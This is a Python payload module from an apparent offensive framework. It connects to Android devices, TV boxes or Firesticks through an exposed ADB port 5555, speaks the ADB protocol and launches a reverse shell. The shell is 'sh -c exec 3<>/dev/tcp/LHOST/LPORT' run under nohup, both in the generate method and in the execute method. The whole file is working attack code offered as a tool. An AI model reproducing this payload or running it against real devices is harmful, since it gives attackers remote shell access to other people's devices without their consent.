"""Android ADB Shell Payload.

Conecta via ADB (Android Debug Bridge) ao dispositivo Android/TV Box/Firestick
com porta ADB 5555 aberta e instala shell reverso.
"""

import socket
import struct
from embedxpl.core.exploit.payloads import BasePayload

# ADB message constants
A_SYNC = 0x434e5953
A_CNXN = 0x4e584e43
A_OPEN = 0x4e45504f
A_OKAY = 0x59414b4f
A_CLSE = 0x45534c43
A_WRTE = 0x45545257
A_AUTH = 0x48545541


class Payload(BasePayload):
    __info__ = {
        "name": "Android ADB Shell",
        "description": "Connect to Android device via open ADB port (5555) and execute reverse shell.",
        "authors": ("André Henrique (@mrhenrike)", "União Geek"),
    }

    options = {
        "RHOST": {"description": "Android device IP", "required": True, "default": "", "value": ""},
        "RPORT": {"description": "ADB port", "required": False, "default": "5555", "value": "5555"},
        "LHOST": {"description": "Reverse shell listener IP", "required": True, "default": "", "value": ""},
        "LPORT": {"description": "Reverse shell listener port", "required": True, "default": "4444", "value": "4444"},
        "COMMAND": {
            "description": "Shell command to execute (default: install reverse shell)",
            "required": False,
            "default": "",
            "value": "",
        },
    }

    def _adb_send(self, sock: socket.socket, cmd: int, arg0: int, arg1: int, data: bytes = b"") -> None:
        """Send ADB protocol message."""
        msg = struct.pack("<IIIIII",
                          cmd, arg0, arg1, len(data),
                          sum(data) & 0xFFFFFFFF,
                          cmd ^ 0xFFFFFFFF)
        sock.sendall(msg + data)

    def _adb_recv(self, sock: socket.socket) -> tuple:
        """Receive ADB protocol message."""
        header = sock.recv(24)
        if len(header) < 24:
            return None, None, None, b""
        cmd, arg0, arg1, data_len, data_chk, magic = struct.unpack("<IIIIII", header)
        data = b""
        while len(data) < data_len:
            chunk = sock.recv(data_len - len(data))
            if not chunk:
                break
            data += chunk
        return cmd, arg0, arg1, data

    def generate(self) -> bytes:
        """Gera script de payload — executa via adb shell."""
        lhost = self.options["LHOST"]["value"]
        lport = self.options["LPORT"]["value"]
        cmd = self.options["COMMAND"]["value"] or (
            f"am start -n com.android.shell/.ShellActivity; "
            f"nohup sh -c 'exec 3<>/dev/tcp/{lhost}/{lport};sh <&3 >&3 2>&3' &"
        )
        return cmd.encode()

    def execute(self) -> bool:
        """Connects to ADB and executes the reverse shell command."""
        rhost = self.options["RHOST"]["value"]
        rport = int(self.options["RPORT"]["value"])
        lhost = self.options["LHOST"]["value"]
        lport = self.options["LPORT"]["value"]

        try:
            sock = socket.create_connection((rhost, rport), timeout=10)
            # ADB handshake
            banner = b"host::features=shell_v2,cmd"
            self._adb_send(sock, A_CNXN, 0x01000000, 256 * 1024, banner)
            cmd, arg0, arg1, data = self._adb_recv(sock)

            if cmd == A_CNXN:
                # Open shell channel
                shell_cmd = (
                    f"shell:nohup sh -c "
                    f"'exec 3<>/dev/tcp/{lhost}/{lport};sh <&3 >&3 2>&3' &"
                ).encode() + b"\x00"
                self._adb_send(sock, A_OPEN, 1, 0, shell_cmd)
                sock.close()
                return True
        except Exception as e:
            return False
        return False
